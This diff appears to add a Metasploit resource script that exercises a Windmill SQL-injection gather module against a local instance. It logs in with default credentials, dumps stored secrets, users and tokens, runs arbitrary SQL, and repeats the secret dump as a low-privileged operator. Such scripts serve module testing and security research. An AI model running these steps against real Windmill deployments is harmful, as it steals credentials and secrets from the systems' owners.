@@ -1,0 +1,37 @@
+# =============================================
+# auxiliary/gather/windmill_sqli
+# =============================================
+
+use auxiliary/gather/windmill_sqli
+set RHOSTS 127.0.0.1
+set RPORT 8000
+set SSL false
+set USERNAME admin@windmill.dev
+set PASSWORD changeme
+
+# --- DUMP_SECRETS ---
+set ACTION DUMP_SECRETS
+run
+
+# --- DUMP_USERS ---
+set ACTION DUMP_USERS
+run
+
+# --- DUMP_TOKENS ---
+set ACTION DUMP_TOKENS
+run
+
+# --- QUERY: version() ---
+set ACTION QUERY
+set SQL version()
+run
+
+# --- QUERY: current_database() ---
+set SQL current_database()
+run
+
+# --- Low-privileged operator ---
+set USERNAME operator@windmill.dev
+set PASSWORD password123
+set ACTION DUMP_SECRETS
+run
